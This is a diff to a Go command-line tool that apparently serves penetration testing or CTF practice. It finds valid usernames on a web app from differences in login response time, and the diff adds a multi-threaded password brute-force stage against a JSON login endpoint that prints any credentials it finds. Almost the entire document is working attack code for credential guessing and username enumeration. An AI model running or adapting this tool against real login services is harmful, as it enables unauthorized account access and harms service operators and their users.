@@ -6,8 +6,10 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io/ioutil"
 	"net/http"
 	"os"
+	"strings"
 	"sync"
 	"time"
 )
@@ -24,6 +26,18 @@ type LoginRequestData struct {
 	Username string `json:"username"`
 	Password string `json:"password"`
 }
+
+type LoginResponse struct {
+	Status string `json:"status"`
+}
+
+type UserCredentials struct {
+	Username string
+	Password string
+}
+
+var USERNAMES_DISCOVERED []string = []string{}
+var CREDENTIALS_DISCOVERED []UserCredentials = []UserCredentials{}
 
 func WordlistGenerator(wordlist string, c chan string) (success bool, message string) {
 	defer close(c)
@@ -42,6 +56,69 @@ func WordlistGenerator(wordlist string, c chan string) (success bool, message st
 	}
 
 	return true, "worlist looped through successfully"
+}
+
+func TestCreds(targetURL string, passwordlist string) {
+	var datachan chan string = make(chan string)
+	var exitflag bool
+	var wg *sync.WaitGroup = new(sync.WaitGroup)
+
+	for _, username := range USERNAMES_DISCOVERED {
+		go WordlistGenerator(passwordlist, datachan)
+		for i := 0; i < 5; i++ {
+			wg.Add(1)
+			go TestPassword(targetURL, username, datachan, wg, &exitflag)
+		}
+		wg.Wait()
+	}
+	return
+}
+
+func TestPassword(targetURL string, username string, c chan string, wg *sync.WaitGroup, exitflag *bool) {
+	defer wg.Done()
+	var logindata LoginRequestData = LoginRequestData{Username: username}
+	var responsedata LoginResponse = LoginResponse{}
+
+	for password := range c {
+		if *exitflag {
+			fmt.Printf(ANSI_CLRLN)
+			return
+		}
+		logindata.Password = password
+		jsondata, err := json.Marshal(logindata)
+		if err != nil {
+			ErrMsg(err.Error())
+		}
+
+		SysMsgNB(fmt.Sprintf("Testing \"%s:%s\"", logindata.Username, logindata.Password))
+		client := http.Client{Timeout: 30 * time.Second}
+		req, err := http.NewRequest("POST", targetURL, bytes.NewReader(jsondata))
+		if err != nil {
+			ErrMsg(err.Error())
+		} else {
+			req.Header.Set("content-type", "application/json")
+			resp, err := client.Do(req)
+			if err != nil {
+				ErrMsg(err.Error())
+			} else {
+				returnbytes, err := ioutil.ReadAll(resp.Body)
+				if err != nil {
+					resp.Body.Close()
+					continue
+				}
+				json.Unmarshal(returnbytes, &responsedata)
+				if strings.ToLower(responsedata.Status) != "invalid username or password" {
+					SucMsg(fmt.Sprintf("Credentials Discovered: \"%s:%s\"", username, password))
+					*exitflag = true
+					resp.Body.Close()
+					return
+				}
+				resp.Body.Close()
+			}
+		}
+	}
+	fmt.Printf(ANSI_CLRLN)
+	return
 }
 
 func TestUsername(targetURL string, c chan string, wg *sync.WaitGroup) {
@@ -71,6 +148,7 @@ func TestUsername(targetURL string, c chan string, wg *sync.WaitGroup) {
 				timediff := time.Now().Sub(timenow)
 				if timediff > time.Second {
 					SucMsg(fmt.Sprintf("Username Found: \"%s\"", logindata.Username))
+					USERNAMES_DISCOVERED = append(USERNAMES_DISCOVERED, username)
 				}
 			}
 		}
@@ -96,7 +174,15 @@ func FindUsername(baseURL string, wordlist string, threadcount int) (success boo
 
 	fmt.Printf(ANSI_CLRLN)
 
-	return true, "at least one username found"
+	if len(USERNAMES_DISCOVERED) > 0 {
+		message = fmt.Sprintf("%d usernames discovered", len(USERNAMES_DISCOVERED))
+		success = true
+	} else {
+		message = "no usernames found"
+		success = false
+	}
+
+	return success, message
 }
 
 func ValidatePort(portno int) (valid bool, message string) {
@@ -148,16 +234,25 @@ func SysMsgNB(msg string) {
 func main() {
 	var baseURL string
 
+	var brutelogin bool
+
+	var message string
+
+	var success bool
+
 	var targetIP string
 	var targetPort int
 	var threadCount int
 
-	var wordlist string
+	var wordlistp string
+	var wordlistu string
 
 	flag.StringVar(&targetIP, "i", "127.0.0.1", "target IP address")
+	flag.BoolVar(&brutelogin, "l", false, "attempt to brute-force login (username + password)")
 	flag.IntVar(&targetPort, "p", 80, "target port")
 	flag.IntVar(&threadCount, "t", 10, "number of threads used to brute force")
-	flag.StringVar(&wordlist, "w", "names_short.txt", "wordlist to use in brute force")
+	flag.StringVar(&wordlistp, "P", "passwords.txt", "wordlist to use in password brute force")
+	flag.StringVar(&wordlistu, "U", "names_short.txt", "wordlist to use in username brute force")
 	flag.Parse()
 
 	valid, message := ValidatePort(targetPort)
@@ -175,12 +270,22 @@ func main() {
 	InfMsg(fmt.Sprintf("Target IP: %s", targetIP))
 	InfMsg(fmt.Sprintf("Target Port: %d", targetPort))
 	InfMsg(fmt.Sprintf("Thread Count: %d", threadCount))
-	InfMsg(fmt.Sprintf("Wordlist: %s", wordlist))
+	InfMsg(fmt.Sprintf("Username Wordlist: %s", wordlistu))
+	InfMsg(fmt.Sprintf("Password Wordlist: %s", wordlistp))
 	fmt.Printf("\n")
 
 	baseURL = fmt.Sprintf("http://%s:%d", targetIP, targetPort)
 
-	FindUsername(baseURL, wordlist, threadCount)
+	success, message = FindUsername(baseURL, wordlistu, threadCount)
+	if !success {
+		ErrMsg(message)
+		os.Exit(1)
+	}
+	SucMsg(message)
+
+	if brutelogin {
+		TestCreds(fmt.Sprintf("%s/api/user/login", baseURL), wordlistp)
+	}
 	return
 }
 
